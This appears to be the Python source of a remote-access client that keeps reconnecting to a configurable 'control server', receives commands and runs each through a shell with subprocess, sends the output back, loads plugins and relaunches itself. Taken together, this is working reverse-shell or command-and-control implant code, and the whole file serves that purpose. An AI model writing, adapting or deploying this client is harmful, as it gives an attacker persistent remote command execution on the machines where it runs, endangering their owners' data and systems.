from __future__ import print_function
import sys
import os
import socket
import subprocess
from os.path import realpath
from base64 import b64decode
from time import sleep
from common import PluginRunner, LoopController


class Client(PluginRunner):
    """
    The Client object is in charge of staying connected to the Server and forwarding
    server commands to the OS, or to Client plugins.
    """

    def __init__(self, host='', port=6667, recv_size=1024, session_id=''):
        self.host = host
        self.port = port
        self.recv_size = recv_size
        self.session_id = session_id
        self.reconnect_to_session = True
        self.ip_address = '0.0.0.0'
        self.connected_port = '00000'
        self.sock = self._connect_to_server()

    def _connect_to_server(self):
        """
        Ping the control server until it accepts the connection.

        :return:
        """

        self.sock = False
        self.connected = False

        # Loop until the connection is successful.
        while True:
            self.sock = socket.socket()
            try:
                self.sock.connect((self.host, self.port))
                print('Connected to server...')
                break
            except socket.error as the_error_message:
                print('Waiting for control server {}:{} {}'.format(self.host, self.port, the_error_message))
                sleep(5)

        return self.sock

    def get_client_plugins(self):
        """
        Dynamically import any client_plugins in the `client_plugins` package.

        :return:
        """

        plugin_list = []
        # todo: Make this windows compatible.
        fp = __file__.replace(__file__.split('/')[-1], '') + 'client_plugins'
        module_names = [n.replace('.py', '').replace('.pyc', '') for n in os.listdir(fp) if '__init__.py' not in n]
        hidden_files = [n for n in os.listdir(fp) if n[0] == '.']
        module_names = [n for n in module_names if n not in hidden_files]

        try:
            module_names.remove('__pycache__')
        except ValueError:
            pass

        for module_name in module_names:
            module = __import__('client_plugins.' + module_name, fromlist=[''])
            plugin_list.append(module)

        return plugin_list

    def terminate(self):
        """
        Send the termination string to the server.

        :return:
        """

        self.send_data('~!_TERM_$~', terminate=False)

    def server_print(self, some_data, echo=True, encode=True, terminate=True):
        """
        A shortcut method to facilitate sending data to the server without worrying about
        whether or not there is a newline character at the end.

        :param some_data:
        :param echo:
        :param encode:
        :param terminate:
        :return:
        """

        some_data = some_data + '\n' if some_data[-1] != '\n' else some_data
        self.send_data(some_data, echo=echo, encode=encode, terminate=terminate)
        return

    def send_data(self, some_data, echo=True, encode=True, terminate=True):
        """
        Send data to the server with the termination string appended.

        :param some_data:
        :param echo:
        :param encode:
        :param terminate:
        :return:
        """

        if echo:
            print('Sending Data:', some_data)

        if encode:
            self.sock.send(str.encode(str(some_data)))
        else:
            self.sock.send(some_data)

        if terminate:
            self.sock.send(str.encode('~!_TERM_$~'))

        return self

    def receive_data(self, echo=False, decode=True):
        """
        Receive data from the server until we get the termination string.

        :param echo:
        :param decode:
        :return:
        """

        # Try to receive data.
        accepting = True
        total_data = ''
        print('Receiving data...')
        while accepting:
            try:
                data = self.sock.recv(self.recv_size)
            except socket.error as error_message:
                print('Server closed connection:', error_message)
                self.sock.close()
                self.sock = self._connect_to_server()
                continue

            # Continue looping if there is no data.
            if len(data) < 1:
                print('Zero data received...', end='\r')
                self.sock.close()
                self.sock = self._connect_to_server()
                continue

            # Decode from bytes.
            if decode:
                d = data.decode('utf-8')
            else:
                d = b64decode(data)

            total_data += d
            if echo:
                print('Data:', d)

            # Check for termination string.
            if total_data[-10:] == '~!_TERM_$~':
                accepting = False

        if echo:
            print('Data received: {}'.format(total_data[:-10]))

        # Chop off the termination string from the total data and assign it to data.
        # Data should now be a string as well.
        data = total_data[:-10]
        return data

    def set_session_id(self, session_id):
        """
        Set the session id for the client.

        :param session_id:
        :return:
        """

        self.session_id = session_id
        return self

    def reboot_self(self):
        """
        Reboot this script.

        :return:
        """

        try:
            self.sock.close()
        except socket.error:
            pass
        rc = [
            sys.executable,
            'port={}'.format(self.port),
            'host={}'.format(self.host),
            'recv_size={}'.format(self.recv_size),
            'session_id='.format(self.session_id)
        ]
        # execv(sys.executable, rc)

        try:
            popen_rc = [sys.executable] + list(sys.argv)
            p = subprocess.Popen(popen_rc)
            p.communicate()
        except PermissionError:
            from os import execv
            print('Using execv...')
            rc.pop(0)
            rc.insert(0, realpath(__file__))
            rc.insert(0, '')
            execv(sys.executable, rc)

        sys.exit()

    def handle_disconnect(self):
        """
        Handle a disconnect event.

        :return:
        """

        print('Disconnecting...')
        # Handle a disconnect command.
        self.send_data('confirmed')
        self.sock.close()
        print('Sleeping for 5 seconds...')
        sleep(5)
        self._connect_to_server()
        return self

    def main(self):
        """
        Start receiving commands.

        :return:
        """

        plugin_list = self.get_client_plugins()
        print('Loaded {} plugins...'.format(len(plugin_list)))

        # If we have a socket, then proceed to receive commands.
        if self.sock:
            # upload_filepath = False
            while True:
                data = self.receive_data()

                if not data:
                    self.send_data('')
                    continue

                # # # # # # # PROCESS PLUGINS # # # # # # #
                if not data[0] == '\\':
                    plugin_ran, loop_controller = self.process_plugins(plugin_list, data)
                    if plugin_ran:
                        if isinstance(loop_controller, LoopController):
                            if loop_controller.should_break:
                                break
                            if loop_controller.should_return:
                                return loop_controller.return_value
                            if loop_controller.should_continue:
                                continue
                        continue

                # Process the command.
                try:
                    cmd = subprocess.Popen(
                        data[:],
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        timeout=600
                    )
                except TypeError:
                    cmd = subprocess.Popen(
                        data[:],
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE
                    )

                # Compile the output.
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                try:
                    output_str = str(output_bytes, 'utf-8')
                except TypeError:
                    output_str = str(output_bytes.decode('utf-8'))

                print('Output Str: {}'.format(output_str))
                # Send the output back to control server.
                self.send_data(output_str)


if __name__ == '__main__':
    the_host = ''
    the_port = 6667
    the_recv_size = 1024
    the_session_id = ''

    def check_cli_arg(arg):
        global the_host
        global the_port
        global the_recv_size
        global the_session_id

        if 'host=' in arg:
            the_host = arg.split('=')[1]
        elif 'port=' in arg:
            the_port = int(arg.split('=')[1])
        elif 'recv_size=' in arg:
            the_recv_size = int(arg.split('=')[1])
        elif 'session_id=' in arg:
            the_session_id = arg.split('=')[1].strip()

    for argument in sys.argv[1:]:
        check_cli_arg(argument)

    # Instantiate the client.
    client = Client(
        host=the_host,
        port=the_port,
        recv_size=the_recv_size,
        session_id=the_session_id
    )

    client.main()
    client.reboot_self()
    sys.exit()

